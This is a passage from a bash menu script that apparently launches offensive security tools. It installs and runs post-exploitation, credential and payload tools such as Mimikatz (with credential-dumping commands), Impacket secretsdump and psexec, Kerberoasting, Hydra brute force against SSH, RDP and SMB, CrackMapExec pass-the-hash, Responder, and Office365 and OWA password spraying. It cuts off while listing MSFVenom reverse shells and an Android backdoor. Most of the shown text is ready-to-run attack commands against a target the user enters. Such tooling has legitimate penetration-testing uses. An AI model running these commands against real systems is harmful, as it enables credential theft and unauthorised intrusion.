                    read -rp "Would you like to install it from GitHub? (yes/no): " install_choice
                    if [[ $install_choice =~ ^[Yy]([Ee][Ss])?$ ]]; then
                        echo -e "\n${BRIGHT_RED}[◆]${RESET} Cloning Sn1per from GitHub...\n"
                        mkdir -p ~/tools
                        git clone https://github.com/1N3/Sn1per ~/tools/Sn1per
                        echo -e "\n${BRIGHT_RED}[◆]${RESET} Installing Sn1per (this may take a while)...\n"
                        cd ~/tools/Sn1per
                        sudo bash install.sh
                        cd -
                    fi
                fi
                if command -v sniper &> /dev/null; then
                    read -rp "Enter target (IP/domain): " target
                    echo -e "\n${BRIGHT_RED}[◆]${RESET} Running Sn1per scan on: $target\n"
                    sudo sniper -t "$target"
                fi
                ;;
            99)
                echo -e "\n${BRIGHT_RED}[◆]${RESET} Returning to Main Menu...\n"
                sleep 1
                clear
                return
                ;;
            *)
                echo -e "\n${BRIGHT_RED}[!]${RESET} ${BRIGHT_BLUE}Invalid selection${RESET}\n"
                sleep 1
                clear
                ;;
        esac
        
        echo ""
        read -rp "${BRIGHT_BLUE}Press Enter to continue...${RESET}"
        clear
        return
    done
}


# CHOICE 4: Post-Exploitation
postexploitation_menu(){
    clear
    display_ascii_info
    echo -e "${BRIGHT_RED}"
    echo ""
    echo ""
    echo "      ╔═════════════════════════════════════════╗"
    echo "      ║${RESET}     ${BRIGHT_BLUE}▓▒░    POST-EXPLOITATION    ░▒▓${BRIGHT_RED}     ║"
    echo "      ╚═════════════════════════════════════════╝"
    echo -e "${RESET}"
    
    echo -e "       System: ${BRIGHT_BLUE}OPERATIONAL${RESET}  ${BRIGHT_RED}✞${RESET}  Security Level: ${BRIGHT_RED}MAXIMUM${RESET}"
    echo ""
    echo -e "        ${BRIGHT_BLUE}┌─                                      ─┐${RESET}"
    echo ""

    local options=(
        "1) LinPEAS/WinPEAS"
        "2) LaZagne"
        "3) Mimikatz"
        "4) Evil-WinRM"
        "5) PowerSploit"
        "6) Linux Smart Enumeration"
        "7) Impacket"
        "99) Back to Main Menu"
    )
    
    for option in "${options[@]}"; do
        echo -e "            ${RED}[${option%%)*}]${RESET} ${BRIGHT_BLUE}${option#*)}${RESET}"
    done
    
    echo ""
    echo -e "        ${BRIGHT_BLUE}└──                                    ──┘${RESET}"
    echo ""
    
    while true; do
        read -rp " ${BRIGHT_BLUE}user@nexus:~${RESET}${BRIGHT_RED}\$${RESET} " sub_choice
        
        case $sub_choice in
            1)
                echo -e "\n${BRIGHT_RED}[◆]${RESET} Checking PEASS-ng (LinPEAS/WinPEAS)...\n"
                if [ ! -d ~/tools/PEASS-ng ]; then
                    echo -e "${BRIGHT_RED}[!]${RESET} ${BRIGHT_BLUE}PEASS-ng is not installed.${RESET}"
                    read -rp "Would you like to install it from GitHub? (yes/no): " install_choice
                    if [[ $install_choice =~ ^[Yy]([Ee][Ss])?$ ]]; then
                        echo -e "\n${BRIGHT_RED}[◆]${RESET} Cloning PEASS-ng from GitHub...\n"
                        mkdir -p ~/tools
                        git clone https://github.com/carlospolop/PEASS-ng.git ~/tools/PEASS-ng
                    fi
                fi
                if [ -d ~/tools/PEASS-ng ]; then
                    echo -e "\n${BRIGHT_RED}[◆]${RESET} PEASS-ng Tools Available:\n"
                    echo -e "${BRIGHT_BLUE}[1]${RESET} LinPEAS (Linux)"
                    echo -e "${BRIGHT_BLUE}[2]${RESET} WinPEAS (Windows or WSL)"
                    echo -e "${BRIGHT_BLUE}[3]${RESET} Show scripts location"
                    read -rp "Select option: " peass_choice
                    case $peass_choice in
                        1)
                            echo -e "\n${BRIGHT_RED}[◆]${RESET} Running LinPEAS...\n"
                            cd ~/tools/PEASS-ng/linPEAS
                            chmod +x linpeas.sh
                            sleep 0.5
                            ./linpeas.sh
                            cd -
                            ;;
                        2)
                            echo -e "\n${BRIGHT_RED}[◆]${RESET} WinPEAS location:\n"
                            echo -e "${BRIGHT_BLUE}~/tools/PEASS-ng/winPEAS/winPEASexe/binaries/x64/Release/winPEASx64.exe${RESET}"
                            echo -e "${BRIGHT_BLUE}Transfer this file to target Windows machine${RESET}\n"
                            ;;
                        3)
                            echo -e "\n${BRIGHT_RED}[◆]${RESET} PEASS Scripts Location:\n"
                            echo -e "${BRIGHT_BLUE}LinPEAS: ~/tools/PEASS-ng/linPEAS/linpeas.sh${RESET}"
                            echo -e "${BRIGHT_BLUE}WinPEAS: ~/tools/PEASS-ng/winPEAS/winPEASexe/binaries/${RESET}\n"
                            ;;
                    esac
                fi
                ;;
            2)
                echo -e "\n${BRIGHT_RED}[◆]${RESET} Checking LaZagne...\n"
                if [ ! -d ~/tools/LaZagne ]; then
                    echo -e "${BRIGHT_RED}[!]${RESET} ${BRIGHT_BLUE}LaZagne is not installed.${RESET}"
                    read -rp "Would you like to install it from GitHub? (yes/no): " install_choice
                    if [[ $install_choice =~ ^[Yy]([Ee][Ss])?$ ]]; then
                        echo -e "\n${BRIGHT_RED}[◆]${RESET} Cloning LaZagne from GitHub...\n"
                        mkdir -p ~/tools
                        git clone https://github.com/AlessandroZ/LaZagne.git ~/tools/LaZagne
                    fi
                fi
                if [ -d ~/tools/LaZagne ]; then
                    echo -e "\n${BRIGHT_RED}[◆]${RESET} LaZagne Password Recovery:\n"
                    echo -e "${BRIGHT_BLUE}[1]${RESET} Run LaZagne (Linux)"
                    echo -e "${BRIGHT_BLUE}[2]${RESET} Show Windows binary location"
                    read -rp "Select option: " laz_choice
                    case $laz_choice in
                        1)
                            echo -e "\n${BRIGHT_RED}[◆]${RESET} Running LaZagne on Linux...\n"
                            cd ~/tools/LaZagne/Linux
                            python3 laZagne.py all
                            cd -
                            ;;
                        2)
                            echo -e "\n${BRIGHT_RED}[◆]${RESET} Windows LaZagne location:\n"
                            echo -e "${BRIGHT_BLUE}~/tools/LaZagne/Windows/laZagne.exe${RESET}"
                            echo -e "${BRIGHT_BLUE}Transfer to Windows and run: laZagne.exe all${RESET}\n"
                            ;;
                    esac
                fi
                ;;
            3)
                echo -e "\n${BRIGHT_RED}[◆]${RESET} Checking Mimikatz...\n"
                if [ ! -d ~/tools/mimikatz ]; then
                    echo -e "${BRIGHT_RED}[!]${RESET} ${BRIGHT_BLUE}Mimikatz is not installed.${RESET}"
                    read -rp "Would you like to download it from GitHub? (yes/no): " install_choice
                    if [[ $install_choice =~ ^[Yy]([Ee][Ss])?$ ]]; then
                        echo -e "\n${BRIGHT_RED}[◆]${RESET} Downloading Mimikatz from GitHub...\n"
                        mkdir -p ~/tools/mimikatz
                        cd ~/tools/mimikatz
                        wget https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip
                        unzip mimikatz_trunk.zip
                        rm mimikatz_trunk.zip
                        cd -
                    fi
                fi
                if [ -d ~/tools/mimikatz ]; then
                    echo -e "\n${BRIGHT_RED}[◆]${RESET} Mimikatz Information:\n"
                    echo -e "${BRIGHT_BLUE}Location: ~/tools/mimikatz/x64/mimikatz.exe${RESET}"
                    echo -e "${BRIGHT_BLUE}Transfer to Windows target and run${RESET}"
                    echo -e "${BRIGHT_BLUE}Common commands:${RESET}"
                    echo -e "  - privilege::debug"
                    echo -e "  - sekurlsa::logonpasswords"
                    echo -e "  - lsadump::sam\n"
                fi
                ;;
            4)
                echo -e "\n${BRIGHT_RED}[◆]${RESET} Checking Evil-WinRM...\n"
                if ! command -v evil-winrm &> /dev/null; then
                    echo -e "${BRIGHT_RED}[!]${RESET} ${BRIGHT_BLUE}Evil-WinRM is not installed.${RESET}"
                    read -rp "Would you like to install it? (yes/no): " install_choice
                    if [[ $install_choice =~ ^[Yy]([Ee][Ss])?$ ]]; then
                        echo -e "\n${BRIGHT_RED}[◆]${RESET} Installing Evil-WinRM...\n"
                        sudo apt-get install -y ruby ruby-dev libssl-dev libxml2-dev libxslt1-dev
                        sudo gem install evil-winrm
                    fi
                fi
                if command -v evil-winrm &> /dev/null; then
                    read -rp "Enter target IP: " target_ip
                    read -rp "Enter username: " username
                    read -rp "Enter password (or press Enter for hash): " password
                    if [ -z "$password" ]; then
                        read -rp "Enter NTLM hash: " hash
                        echo -e "\n${BRIGHT_RED}[◆]${RESET} Connecting to $target_ip with hash...\n"
                        evil-winrm -i "$target_ip" -u "$username" -H "$hash"
                    else
                        echo -e "\n${BRIGHT_RED}[◆]${RESET} Connecting to $target_ip...\n"
                        evil-winrm -i "$target_ip" -u "$username" -p "$password"
                    fi
                fi
                ;;
            5)
                echo -e "\n${BRIGHT_RED}[◆]${RESET} Checking PowerSploit...\n"
                if [ ! -d ~/tools/PowerSploit ]; then
                    echo -e "${BRIGHT_RED}[!]${RESET} ${BRIGHT_BLUE}PowerSploit is not installed.${RESET}"
                    read -rp "Would you like to install it from GitHub? (yes/no): " install_choice
                    if [[ $install_choice =~ ^[Yy]([Ee][Ss])?$ ]]; then
                        echo -e "\n${BRIGHT_RED}[◆]${RESET} Cloning PowerSploit from GitHub...\n"
                        mkdir -p ~/tools
                        git clone https://github.com/PowerShellMafia/PowerSploit.git ~/tools/PowerSploit
                    fi
                fi
                if [ -d ~/tools/PowerSploit ]; then
                    echo -e "\n${BRIGHT_RED}[◆]${RESET} PowerSploit Modules:\n"
                    echo -e "${BRIGHT_BLUE}Location: ~/tools/PowerSploit/${RESET}"
                    echo -e "${BRIGHT_BLUE}Available modules:${RESET}"
                    echo -e "  - CodeExecution/"
                    echo -e "  - ScriptModification/"
                    echo -e "  - Persistence/"
                    echo -e "  - AntivirusBypass/"
                    echo -e "  - Exfiltration/"
                    echo -e "  - Mayhem/"
                    echo -e "  - Privesc/"
                    echo -e "  - Recon/\n"
                    echo -e "${BRIGHT_BLUE}Usage: Import-Module ~/tools/PowerSploit/[Module]/[Script].ps1${RESET}\n"
                fi
                ;;
            6)
                echo -e "\n${BRIGHT_RED}[◆]${RESET} Checking Linux Smart Enumeration...\n"
                if [ ! -d ~/tools/linux-smart-enumeration ]; then
                    echo -e "${BRIGHT_RED}[!]${RESET} ${BRIGHT_BLUE}Linux Smart Enumeration is not installed.${RESET}"
                    read -rp "Would you like to install it from GitHub? (yes/no): " install_choice
                    if [[ $install_choice =~ ^[Yy]([Ee][Ss])?$ ]]; then
                        echo -e "\n${BRIGHT_RED}[◆]${RESET} Cloning Linux Smart Enumeration from GitHub...\n"
                        mkdir -p ~/tools
                        git clone https://github.com/diego-treitos/linux-smart-enumeration.git ~/tools/linux-smart-enumeration
                        chmod +x ~/tools/linux-smart-enumeration/lse.sh
                    fi
                fi
                if [ -d ~/tools/linux-smart-enumeration ]; then
                    echo -e "\n${BRIGHT_RED}[◆]${RESET} Running Linux Smart Enumeration...\n"
                    echo -e "${BRIGHT_BLUE}[0]${RESET} Level 0 - Basic enumeration"
                    echo -e "${BRIGHT_BLUE}[1]${RESET} Level 1 - Interesting info"
                    echo -e "${BRIGHT_BLUE}[2]${RESET} Level 2 - Complete scan"
                    read -rp "Select level (0-2): " level
                    cd ~/tools/linux-smart-enumeration
                    ./lse.sh -l "$level"
                    cd -
                fi
                ;;
            7)
                echo -e "\n${BRIGHT_RED}[◆]${RESET} Checking Impacket...\n"
                if ! python3 -c "import impacket" 2>/dev/null; then
                    echo -e "${BRIGHT_RED}[!]${RESET} ${BRIGHT_BLUE}Impacket is not installed.${RESET}"
                    read -rp "Would you like to install it from GitHub? (yes/no): " install_choice
                    if [[ $install_choice =~ ^[Yy]([Ee][Ss])?$ ]]; then
                        echo -e "\n${BRIGHT_RED}[◆]${RESET} Installing Impacket...\n"
                        mkdir -p ~/tools
                        git clone https://github.com/fortra/impacket.git ~/tools/impacket
                        cd ~/tools/impacket
                        pip3 install .
                        cd -
                    fi
                fi
                if python3 -c "import impacket" 2>/dev/null; then
                    echo -e "\n${BRIGHT_RED}[◆]${RESET} Impacket Tools:\n"
                    echo -e "${BRIGHT_BLUE}[1]${RESET} psexec.py - Remote command execution"
                    echo -e "${BRIGHT_BLUE}[2]${RESET} secretsdump.py - Dump credentials"
                    echo -e "${BRIGHT_BLUE}[3]${RESET} GetNPUsers.py - AS-REP Roasting"
                    echo -e "${BRIGHT_BLUE}[4]${RESET} GetUserSPNs.py - Kerberoasting"
                    echo -e "${BRIGHT_BLUE}[5]${RESET} Show all tools"
                    read -rp "Select option: " imp_choice
                    case $imp_choice in
                        1)
                            read -rp "Enter target (IP or domain): " target
                            read -rp "Enter username: " user
                            read -rp "Enter password: " pass
                            echo -e "\n${BRIGHT_RED}[◆]${RESET} Running psexec...\n"
                            impacket-psexec "$user:$pass@$target"
                            ;;
                        2)
                            read -rp "Enter target (IP or domain): " target
                            read -rp "Enter username: " user
                            read -rp "Enter password: " pass
                            echo -e "\n${BRIGHT_RED}[◆]${RESET} Dumping credentials...\n"
                            impacket-secretsdump "$user:$pass@$target"
                            ;;
                        3)
                            read -rp "Enter domain: " domain
                            echo -e "\n${BRIGHT_RED}[◆]${RESET} Running AS-REP Roasting...\n"
                            impacket-GetNPUsers "$domain/" -no-pass -usersfile users.txt
                            ;;
                        4)
                            read -rp "Enter domain: " domain
                            read -rp "Enter username: " user
                            read -rp "Enter password: " pass
                            echo -e "\n${BRIGHT_RED}[◆]${RESET} Running Kerberoasting...\n"
                            impacket-GetUserSPNs "$domain/$user:$pass" -request
                            ;;
                        5)
                            echo -e "\n${BRIGHT_RED}[◆]${RESET} Available Impacket Tools:\n"
                            ls /usr/local/bin/impacket-* 2>/dev/null || ls ~/.local/bin/impacket-* 2>/dev/null
                            ;;
                    esac
                fi
                ;;
            99)
                echo -e "\n${BRIGHT_RED}[◆]${RESET} Returning to Main Menu...\n"
                sleep 1
                clear
                return
                ;;
            *)
                echo -e "\n${BRIGHT_RED}[!]${RESET} ${BRIGHT_BLUE}Invalid selection${RESET}\n"
                sleep 1
                clear
                ;;
        esac
        
        echo ""
        read -rp "${BRIGHT_BLUE}Press Enter to continue...${RESET}"
        clear
        return
    done
}

#CHOICE 5: Credential Harvester (Placeholder)

credential_menu(){
    clear
    display_ascii_info
    echo -e "${BRIGHT_RED}"
    echo ""
    echo ""
    echo "      ╔═════════════════════════════════════════════╗"
    echo "      ║${RESET}     ${BRIGHT_BLUE}▓▒░    CREDENTIAL HARVESTING    ░▒▓${BRIGHT_RED}     ║"
    echo "      ╚═════════════════════════════════════════════╝"
    echo -e "${RESET}"
    
    echo -e "       System: ${BRIGHT_BLUE}OPERATIONAL${RESET}  ${BRIGHT_RED}✞${RESET}  Security Level: ${BRIGHT_RED}MAXIMUM${RESET}"
    echo ""
    echo -e "        ${BRIGHT_BLUE}┌─                                      ─┐${RESET}"
    echo ""

    local options=(
        "1) Hashcat"
        "2) John the Ripper"
        "3) Hydra"
        "4) CrackMapExec"
        "5) Responder"
        "6) CredMaster"
        "7) BruteSpray"
        "99) Back to Main Menu"
    )
    
    for option in "${options[@]}"; do
        echo -e "            ${RED}[${option%%)*}]${RESET} ${BRIGHT_BLUE}${option#*)}${RESET}"
    done
    
    echo ""
    echo -e "        ${BRIGHT_BLUE}└──                                    ──┘${RESET}"
    echo ""
    
    while true; do
        read -rp " ${BRIGHT_BLUE}user@nexus:~${RESET}${BRIGHT_RED}\$${RESET} " sub_choice
        
        case $sub_choice in
            1)
                echo -e "\n${BRIGHT_RED}[◆]${RESET} Checking Hashcat...\n"
                if check_and_install_tool "hashcat" "sudo apt-get install -y hashcat"; then
                    echo -e "\n${BRIGHT_RED}[◆]${RESET} Hashcat Hash Cracking:\n"
                    echo -e "${BRIGHT_BLUE}[1]${RESET} Crack MD5 hash"
                    echo -e "${BRIGHT_BLUE}[2]${RESET} Crack NTLM hash"
                    echo -e "${BRIGHT_BLUE}[3]${RESET} Crack SHA256 hash"
                    echo -e "${BRIGHT_BLUE}[4]${RESET} Show hash modes"
                    echo -e "${BRIGHT_BLUE}[5]${RESET} Custom attack"
                    read -rp "Select option: " hash_choice
                    case $hash_choice in
                        1)
                            read -rp "Enter hash file path: " hashfile
                            read -rp "Enter wordlist path (default: /usr/share/wordlists/rockyou.txt): " wordlist
                            wordlist=${wordlist:-/usr/share/wordlists/rockyou.txt}
                            echo -e "\n${BRIGHT_RED}[◆]${RESET} Cracking MD5 hashes...\n"
                            hashcat -m 0 -a 0 "$hashfile" "$wordlist"
                            ;;
                        2)
                            read -rp "Enter hash file path: " hashfile
                            read -rp "Enter wordlist path: " wordlist
                            echo -e "\n${BRIGHT_RED}[◆]${RESET} Cracking NTLM hashes...\n"
                            hashcat -m 1000 -a 0 "$hashfile" "$wordlist"
                            ;;
                        3)
                            read -rp "Enter hash file path: " hashfile
                            read -rp "Enter wordlist path: " wordlist
                            echo -e "\n${BRIGHT_RED}[◆]${RESET} Cracking SHA256 hashes...\n"
                            hashcat -m 1400 -a 0 "$hashfile" "$wordlist"
                            ;;
                        4)
                            echo -e "\n${BRIGHT_RED}[◆]${RESET} Common Hash Modes:\n"
                            hashcat --example-hashes | head -n 50
                            ;;
                        5)
                            read -rp "Enter hash mode (-m): " mode
                            read -rp "Enter hash file: " hashfile
                            read -rp "Enter wordlist: " wordlist
                            echo -e "\n${BRIGHT_RED}[◆]${RESET} Running custom attack...\n"
                            hashcat -m "$mode" -a 0 "$hashfile" "$wordlist"
                            ;;
                    esac
                fi
                ;;
            2)
                echo -e "\n${BRIGHT_RED}[◆]${RESET} Checking John the Ripper...\n"
                if check_and_install_tool "john" "sudo apt-get install -y john"; then
                    echo -e "\n${BRIGHT_RED}[◆]${RESET} John the Ripper:\n"
                    echo -e "${BRIGHT_BLUE}[1]${RESET} Crack password file"
                    echo -e "${BRIGHT_BLUE}[2]${RESET} Crack with wordlist"
                    echo -e "${BRIGHT_BLUE}[3]${RESET} Show cracked passwords"
                    echo -e "${BRIGHT_BLUE}[4]${RESET} Crack ZIP file"
                    read -rp "Select option: " john_choice
                    case $john_choice in
                        1)
                            read -rp "Enter hash file path: " hashfile
                            echo -e "\n${BRIGHT_RED}[◆]${RESET} Cracking with default mode...\n"
                            john "$hashfile"
                            ;;
                        2)
                            read -rp "Enter hash file path: " hashfile
                            read -rp "Enter wordlist path: " wordlist
                            echo -e "\n${BRIGHT_RED}[◆]${RESET} Cracking with wordlist...\n"
                            john --wordlist="$wordlist" "$hashfile"
                            ;;
                        3)
                            read -rp "Enter hash file path: " hashfile
                            echo -e "\n${BRIGHT_RED}[◆]${RESET} Showing cracked passwords...\n"
                            john --show "$hashfile"
                            ;;
                        4)
                            read -rp "Enter ZIP file path: " zipfile
                            echo -e "\n${BRIGHT_RED}[◆]${RESET} Extracting hash from ZIP...\n"
                            zip2john "$zipfile" > zip_hash.txt
                            echo -e "${BRIGHT_RED}[◆]${RESET} Cracking ZIP password...\n"
                            john zip_hash.txt
                            ;;
                    esac
                fi
                ;;
            3)
                echo -e "\n${BRIGHT_RED}[◆]${RESET} Checking Hydra...\n"
                if check_and_install_tool "hydra" "sudo apt-get install -y hydra"; then
                    echo -e "\n${BRIGHT_RED}[◆]${RESET} Hydra Network Brute Force:\n"
                    echo -e "${BRIGHT_BLUE}[1]${RESET} SSH brute force"
                    echo -e "${BRIGHT_BLUE}[2]${RESET} FTP brute force"
                    echo -e "${BRIGHT_BLUE}[3]${RESET} HTTP POST brute force"
                    echo -e "${BRIGHT_BLUE}[4]${RESET} RDP brute force"
                    echo -e "${BRIGHT_BLUE}[5]${RESET} SMB brute force"
                    read -rp "Select option: " hydra_choice
                    case $hydra_choice in
                        1)
                            read -rp "Enter target IP: " target
                            read -rp "Enter username (or user list file): " user
                            read -rp "Enter password list: " passlist
                            echo -e "\n${BRIGHT_RED}[◆]${RESET} Brute forcing SSH...\n"
                            hydra -l "$user" -P "$passlist" "$target" ssh
                            ;;
                        2)
                            read -rp "Enter target IP: " target
                            read -rp "Enter username: " user
                            read -rp "Enter password list: " passlist
                            echo -e "\n${BRIGHT_RED}[◆]${RESET} Brute forcing FTP...\n"
                            hydra -l "$user" -P "$passlist" "$target" ftp
                            ;;
                        3)
                            read -rp "Enter target URL: " target
                            read -rp "Enter username: " user
                            read -rp "Enter password list: " passlist
                            read -rp "Enter POST parameters: " params
                            echo -e "\n${BRIGHT_RED}[◆]${RESET} Brute forcing HTTP POST...\n"
                            hydra -l "$user" -P "$passlist" "$target" http-post-form "$params"
                            ;;
                        4)
                            read -rp "Enter target IP: " target
                            read -rp "Enter username: " user
                            read -rp "Enter password list: " passlist
                            echo -e "\n${BRIGHT_RED}[◆]${RESET} Brute forcing RDP...\n"
                            hydra -l "$user" -P "$passlist" rdp://"$target"
                            ;;
                        5)
                            read -rp "Enter target IP: " target
                            read -rp "Enter username: " user
                            read -rp "Enter password list: " passlist
                            echo -e "\n${BRIGHT_RED}[◆]${RESET} Brute forcing SMB...\n"
                            hydra -l "$user" -P "$passlist" "$target" smb
                            ;;
                    esac
                fi
                ;;
            4)
                echo -e "\n${BRIGHT_RED}[◆]${RESET} Checking CrackMapExec...\n"
                if ! command -v crackmapexec &> /dev/null && ! command -v cme &> /dev/null; then
                    echo -e "${BRIGHT_RED}[!]${RESET} ${BRIGHT_BLUE}CrackMapExec is not installed.${RESET}"
                    read -rp "Would you like to install it? (yes/no): " install_choice
                    if [[ $install_choice =~ ^[Yy]([Ee][Ss])?$ ]]; then
                        echo -e "\n${BRIGHT_RED}[◆]${RESET} Installing CrackMapExec...\n"
                        sudo apt-get install -y crackmapexec
                    fi
                fi
                if command -v crackmapexec &> /dev/null || command -v cme &> /dev/null; then
                    CME_CMD=$(command -v crackmapexec || command -v cme)
                    echo -e "\n${BRIGHT_RED}[◆]${RESET} CrackMapExec Operations:\n"
                    echo -e "${BRIGHT_BLUE}[1]${RESET} SMB password spray"
                    echo -e "${BRIGHT_BLUE}[2]${RESET} SMB enumeration"
                    echo -e "${BRIGHT_BLUE}[3]${RESET} Dump SAM database"
                    echo -e "${BRIGHT_BLUE}[4]${RESET} Pass-the-Hash"
                    read -rp "Select option: " cme_choice
                    case $cme_choice in
                        1)
                            read -rp "Enter target IP/range: " target
                            read -rp "Enter username: " user
                            read -rp "Enter password: " pass
                            echo -e "\n${BRIGHT_RED}[◆]${RESET} Password spraying...\n"
                            $CME_CMD smb "$target" -u "$user" -p "$pass"
                            ;;
                        2)
                            read -rp "Enter target IP: " target
                            echo -e "\n${BRIGHT_RED}[◆]${RESET} Enumerating SMB shares...\n"
                            $CME_CMD smb "$target" --shares
                            ;;
                        3)
                            read -rp "Enter target IP: " target
                            read -rp "Enter username: " user
                            read -rp "Enter password: " pass
                            echo -e "\n${BRIGHT_RED}[◆]${RESET} Dumping SAM...\n"
                            $CME_CMD smb "$target" -u "$user" -p "$pass" --sam
                            ;;
                        4)
                            read -rp "Enter target IP: " target
                            read -rp "Enter username: " user
                            read -rp "Enter NTLM hash: " hash
                            echo -e "\n${BRIGHT_RED}[◆]${RESET} Pass-the-Hash attack...\n"
                            $CME_CMD smb "$target" -u "$user" -H "$hash"
                            ;;
                    esac
                fi
                ;;
            5)
                echo -e "\n${BRIGHT_RED}[◆]${RESET} Checking Responder...\n"
                if [ ! -d ~/tools/Responder ]; then
                    echo -e "${BRIGHT_RED}[!]${RESET} ${BRIGHT_BLUE}Responder is not installed.${RESET}"
                    read -rp "Would you like to install it from GitHub? (yes/no): " install_choice
                    if [[ $install_choice =~ ^[Yy]([Ee][Ss])?$ ]]; then
                        echo -e "\n${BRIGHT_RED}[◆]${RESET} Cloning Responder from GitHub...\n"
                        mkdir -p ~/tools
                        git clone https://github.com/lgandx/Responder.git ~/tools/Responder
                    fi
                fi
                if [ -d ~/tools/Responder ]; then
                    read -rp "Enter network interface (e.g., eth0): " interface
                    echo -e "\n${BRIGHT_RED}[◆]${RESET} Starting Responder to capture credentials...\n"
                    echo -e "${BRIGHT_BLUE}Press Ctrl+C to stop${RESET}\n"
                    cd ~/tools/Responder
                    sudo python3 Responder.py -I "$interface" -wrf
                    cd -
                fi
                ;;
            6)
                echo -e "\n${BRIGHT_RED}[◆]${RESET} Checking CredMaster...\n"
                if [ ! -d ~/tools/CredMaster ]; then
                    echo -e "${BRIGHT_RED}[!]${RESET} ${BRIGHT_BLUE}CredMaster is not installed.${RESET}"
                    read -rp "Would you like to install it from GitHub? (yes/no): " install_choice
                    if [[ $install_choice =~ ^[Yy]([Ee][Ss])?$ ]]; then
                        echo -e "\n${BRIGHT_RED}[◆]${RESET} Cloning CredMaster from GitHub...\n"
                        mkdir -p ~/tools
                        git clone https://github.com/knavesec/CredMaster.git ~/tools/CredMaster
                        echo -e "\n${BRIGHT_RED}[◆]${RESET} Installing dependencies...\n"
                        pip3 install -r ~/tools/CredMaster/requirements.txt
                    fi
                fi
                if [ -d ~/tools/CredMaster ]; then
                    echo -e "\n${BRIGHT_RED}[◆]${RESET} CredMaster Password Spraying:\n"
                    echo -e "${BRIGHT_BLUE}[1]${RESET} Office365 spray"
                    echo -e "${BRIGHT_BLUE}[2]${RESET} OWA spray"
                    echo -e "${BRIGHT_BLUE}[3]${RESET} Custom spray"
                    read -rp "Select option: " cred_choice
                    case $cred_choice in
                        1)
                            read -rp "Enter user list file: " userlist
                            read -rp "Enter password: " password
                            echo -e "\n${BRIGHT_RED}[◆]${RESET} Spraying Office365...\n"
                            cd ~/tools/CredMaster
                            python3 credmaster.py --plugin o365 -u "$userlist" -p "$password"
                            cd -
                            ;;
                        2)
                            read -rp "Enter OWA URL: " url
                            read -rp "Enter user list file: " userlist
                            read -rp "Enter password: " password
                            echo -e "\n${BRIGHT_RED}[◆]${RESET} Spraying OWA...\n"
                            cd ~/tools/CredMaster
                            python3 credmaster.py --plugin owa --url "$url" -u "$userlist" -p "$password"
                            cd -
                            ;;
                        3)
                            echo -e "\n${BRIGHT_RED}[◆]${RESET} Available plugins:\n"
                            cd ~/tools/CredMaster
                            python3 credmaster.py --list-plugins
                            cd -
                            ;;
                    esac
                fi
                ;;
            7)
                echo -e "\n${BRIGHT_RED}[◆]${RESET} Checking BruteSpray...\n"
                if [ ! -d ~/tools/brutespray ]; then
                    echo -e "${BRIGHT_RED}[!]${RESET} ${BRIGHT_BLUE}BruteSpray is not installed.${RESET}"
                    read -rp "Would you like to install it from GitHub? (yes/no): " install_choice
                    if [[ $install_choice =~ ^[Yy]([Ee][Ss])?$ ]]; then
                        echo -e "\n${BRIGHT_RED}[◆]${RESET} Cloning BruteSpray from GitHub...\n"
                        mkdir -p ~/tools
                        git clone https://github.com/x90skysn3k/brutespray.git ~/tools/brutespray
                        echo -e "\n${BRIGHT_RED}[◆]${RESET} Installing dependencies...\n"
                        cd ~/tools/brutespray
                        pip3 install -r requirements.txt
                        cd -
                    fi
                fi
                if [ -d ~/tools/brutespray ]; then
                    read -rp "Enter Nmap XML file path: " nmapfile
                    echo -e "\n${BRIGHT_RED}[◆]${RESET} Running BruteSpray on discovered services...\n"
                    cd ~/tools/brutespray
                    python3 brutespray.py --file "$nmapfile" --threads 5 --hosts 5
                    cd -
                fi
                ;;
            99)
                echo -e "\n${BRIGHT_RED}[◆]${RESET} Returning to Main Menu...\n"
                sleep 1
                clear
                return
                ;;
            *)
                echo -e "\n${BRIGHT_RED}[!]${RESET} ${BRIGHT_BLUE}Invalid selection${RESET}\n"
                sleep 1
                clear
                ;;
        esac
        
        echo ""
        read -rp "${BRIGHT_BLUE}Press Enter to continue...${RESET}"
        clear
        return
    done
}

# CHOICE 6: Payload Generator
payload_menu(){
    clear
    display_ascii_info
    echo -e "${BRIGHT_RED}"
    echo ""
    echo ""
    echo "      ╔═════════════════════════════════════════════╗"
    echo "      ║${RESET}       ${BRIGHT_BLUE}▓▒░    PAYLOAD GENERATOR    ░▒▓${BRIGHT_RED}       ║"
    echo "      ╚═════════════════════════════════════════════╝"
    echo -e "${RESET}"
    
    echo -e "       System: ${BRIGHT_BLUE}OPERATIONAL${RESET}  ${BRIGHT_RED}✞${RESET}  Security Level: ${BRIGHT_RED}MAXIMUM${RESET}"
    echo ""
    echo -e "        ${BRIGHT_BLUE}┌─                                      ─┐${RESET}"
    echo ""

    local options=(
        "1) MSFVenom"
        "2) Veil-Framework"
        "3) TheFatRat"
        "4) Shellter"
        "5) Hoaxshell"
        "6) Donut"
        "7) ScareCrow"
        "99) Back to Main Menu"
    )
    
    for option in "${options[@]}"; do
        echo -e "            ${RED}[${option%%)*}]${RESET} ${BRIGHT_BLUE}${option#*)}${RESET}"
    done
    
    echo ""
    echo -e "        ${BRIGHT_BLUE}└──                                    ──┘${RESET}"
    echo ""
    
    while true; do
        read -rp " ${BRIGHT_BLUE}user@nexus:~${RESET}${BRIGHT_RED}\$${RESET} " sub_choice
        
        case $sub_choice in
            1)
                echo -e "\n${BRIGHT_RED}[◆]${RESET} Checking MSFVenom...\n"
                if ! command -v msfvenom &> /dev/null; then
                    echo -e "${BRIGHT_RED}[!]${RESET} ${BRIGHT_BLUE}MSFVenom not found. Install Metasploit first.${RESET}"
                    read -rp "Do you want to install Metasploit? (yes/no): " install_choice
                    if [[ $install_choice =~ ^[Yy]([Ee][Ss])?$ ]]; then
                        echo -e "\n${BRIGHT_RED}[◆]${RESET} Installing Metasploit Framework...\n"
                        curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
                        chmod 755 msfinstall
                        sudo ./msfinstall
                        rm msfinstall
                    fi
                fi
                if command -v msfvenom &> /dev/null; then
                    echo -e "\n${BRIGHT_RED}[◆]${RESET} MSFVenom Payload Generator:\n"
                    echo -e "${BRIGHT_BLUE}[1]${RESET} Windows Reverse Shell (EXE)"
                    echo -e "${BRIGHT_BLUE}[2]${RESET} Linux Reverse Shell (ELF)"
                    echo -e "${BRIGHT_BLUE}[3]${RESET} PHP Reverse Shell"
                    echo -e "${BRIGHT_BLUE}[4]${RESET} Python Reverse Shell"
                    echo -e "${BRIGHT_BLUE}[5]${RESET} Android APK Backdoor"
